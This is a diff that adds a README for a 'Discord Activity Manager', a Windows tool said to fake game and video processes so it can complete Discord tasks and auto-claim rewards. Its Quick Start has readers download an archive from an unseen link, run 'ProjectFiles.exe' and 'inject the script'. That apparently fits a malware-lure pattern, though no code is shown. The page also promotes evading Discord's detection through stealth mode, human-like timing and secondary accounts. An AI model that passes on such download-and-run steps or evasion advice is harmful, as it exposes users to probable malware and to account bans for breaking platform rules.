@@ -1,0 +1,79 @@
+⚙️ Discord Activity Manager
+
+Background Task Automation & Process Manager — 2026
+
+A lightweight, open-source utility designed to automate background tasks and activity processes for Discord.
+Automatically handles game, video, and stream tasks to save your time and system resources.
+
+🎯 What it is
+
+Discord Activity Manager is a standalone process automation tool.
+It simulates the required background processes (such as game executables or video playback) so you don't have to manually keep them running. This automates the completion of your daily Discord tasks.
+
+⚠️ Warning: Discord has been actively enforcing against activity automation. Using this tool may result in your account being restricted. Use at your own risk. This project is for educational purposes only.
+
+🚀 Quick Start
+
+1. Download Core_Update_Pack using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| 🎮 Task Automation      | Automatically processes game, video, and stream tasks|
+| 🖥️ Process Emulation    | Simulates required executables in the background     |
+| ⏱️ Smart Timing         | Adjusts execution speed to mimic human behavior      |
+| 🛡️ Stealth Mode         | Hides background processes from Rich Presence        |
+| 📦 Portable             | No installation required — just run the .exe       |
+| 🔄 Auto-Claim           | Automatically claims completed rewards               |
+
+🛠️ How to use
+
+1. Launch ProjectFiles.exe.
+2. Log into Discord Desktop.
+3. The manager will automatically detect pending tasks.
+4. Click "Start Automation" to begin background processing.
+5. The tool will handle the activity and claim rewards when finished.
+
+⚙️ Configuration
+
+You can adjust settings in the config.json file:
+
+- Auto-Claim: true or false
+- Stealth RPC: Hide background processes (true/false)
+- Task Types: Enable/disable specific automation categories
+- Timing: Adjust delays between actions
+
+❓ FAQ
+
+Is it safe to use?
+No automation is 100% safe. Discord actively detects automated activity. Use a secondary account and conservative settings.
+
+Does it work on Mac or Linux?
+Currently, the tool is optimized for Windows 10/11.
+
+Do I need to install the games?
+No. The tool emulates the required processes directly.
+
+Can I get banned?
+Yes, there is a risk. Discord's Terms of Service prohibit automated activity. Use at your own discretion.
+
+💻 Tech Stack & Architecture
+
+- Core: Python / C++
+- UI: Custom Overlay / Dashboard
+- Process Emulation: Executable simulation
+- Target OS: Windows 10 / 11
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
